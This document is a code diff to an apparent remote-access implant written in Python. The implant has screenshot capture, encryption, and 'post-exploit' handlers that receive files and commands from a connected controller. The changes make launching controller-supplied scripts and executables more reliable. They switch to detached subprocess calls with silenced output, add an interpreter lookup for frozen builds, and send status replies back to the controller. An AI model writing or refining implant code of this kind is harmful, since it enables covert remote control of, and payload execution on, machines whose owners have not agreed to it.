@@ -16,6 +16,7 @@ import io
 import json
 import threading
 import shlex
+import shutil as shell_shutil
 from PIL import ImageGrab
 from plyer import notification
 from cryptography.fernet import Fernet
@@ -284,7 +285,7 @@ def main():
 def download_post_exploit_command(conn):
     send_data(conn, b'control')
     path = handle_upload(conn, getName=True)
-    print("path: " + path)
+    print("path: " + str(path))
     
     if path and os.path.exists(path):
         file_name = os.path.basename(path)
@@ -319,7 +320,7 @@ def handle_register_post_exploit(conn):
         return saved_path
     except Exception as e:
         try:
-            send_data(conn, b'FAILED: ' + e.encode())
+            send_data(conn, ("FAILED: " + str(e)).encode())
         except Exception:
             pass
         return None
@@ -327,11 +328,12 @@ def handle_register_post_exploit(conn):
 def handle_start_post_exploit(conn):
     try:
         command_trigger = recv_command(conn)
-
-        return exploit.execute_command(command_trigger)
-    except Exception:
+        started = exploit.execute_command(command_trigger)
+        send_data(conn, b"CONTROLLER_STARTED" if started else b"CONTROLLER_FAILED")
+        return started
+    except Exception as e:
         try:
-            send_data(conn, b"ERROR_CONTROLLER")
+            send_data(conn, ("ERROR_CONTROLLER: " + str(e)).encode())
         except Exception:
             pass
 
@@ -444,21 +446,28 @@ class Exploit:
         try:
             if os.name == "nt":
                 if is_python_script:
-                    executable_path = sys.executable
-                    cmd = 'start "" "{0}" "{1}"'.format(executable_path, target_path)
-                    if args_list:
-                        cmd += " " + " ".join(shlex.quote(str(arg)) for arg in args_list)
+                    python_executable = self._get_python_launcher()
+                    if not python_executable:
+                        return False
+                    cmd = ['cmd', '/c', 'start', '', python_executable, target_path] + args_list
                 else:
-                    cmd = 'start "" "{0}"'.format(target_path)
-                    if args_list:
-                        cmd += " " + " ".join(shlex.quote(str(arg)) for arg in args_list)
-                os.system(cmd)
+                    cmd = ['cmd', '/c', 'start', '', target_path] + args_list
+                subprocess.Popen(cmd, shell=False)
             else:
                 proc_args = ([sys.executable, target_path] if is_python_script else [target_path]) + args_list
-                os.system(cmd)
+                subprocess.Popen(proc_args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
             return True
         except Exception:
             return False
+
+    def _get_python_launcher(self):
+        if not getattr(sys, "frozen", False):
+            return sys.executable
+        for candidate in ("py", "python", "python3"):
+            found = shell_shutil.which(candidate)
+            if found:
+                return found
+        return None
 
     def execute_command(self, raw_command):
         """Execute a registered command trigger with optional trailing arguments.
